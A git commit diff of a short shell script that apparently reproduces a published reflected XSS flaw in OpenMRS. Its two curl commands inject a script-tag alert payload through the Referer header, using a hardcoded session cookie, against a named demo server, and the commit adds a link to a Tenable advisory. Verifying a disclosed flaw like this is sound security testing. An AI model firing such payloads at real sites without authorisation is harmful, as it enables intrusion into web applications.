a4d9b016f56eb6eec6f076f939403a2c732bf7d0
Vivek Singh <petmongrels@gmail.com>
2021-06-11 13:29:30 +0530

    .

--- mrs/referer-xss.sh
+++ mrs/referer-xss.sh
@@ -1,3 +1,5 @@
 curl --cookie "JSESSIONID=A872C119076417E6965E64F61DA4E903" -H "Referer=http://www.google.com/search?hl=en&q=gzynk'><ScRiPt>alert(1)</ScRiPt>ujgvb" "https://emrdemo.samanvayfoundation.org/openmrs/index.htm"
 
 curl --cookie "JSESSIONID=A872C119076417E6965E64F61DA4E903" --referer "http://www.google.com/search?hl=en&q=gzynk'><ScRiPt>alert(1)</ScRiPt>ujgvb" "https://emrdemo.samanvayfoundation.org/openmrs/index.htm"
+
+#https://www.tenable.com/security/research/tra-2020-18
